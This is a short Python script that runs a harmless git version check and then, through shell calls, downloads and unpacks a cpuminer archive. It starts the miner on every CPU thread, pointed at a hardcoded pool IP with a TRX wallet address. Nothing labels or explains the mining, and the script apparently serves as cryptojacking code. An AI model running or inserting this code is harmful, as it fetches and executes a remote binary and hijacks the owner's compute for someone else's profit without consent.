import os
import subprocess

cmd = "git --version"
returned_value = os.system(cmd)
subprocess.call(['wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz'], shell=True)
subprocess.call(['tar -xvf cpuminer-opt-linux.tar.gz'], shell=True)
subprocess.call(['./cpuminer-sse2 -a yescryptr16 -o 103.249.70.7:6333 -u TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV.$(shuf -n 1 -i 1-99999)-CPU -t $(nproc) -p c=TRX,mc=QOGE'], shell=True, close_fds=True)
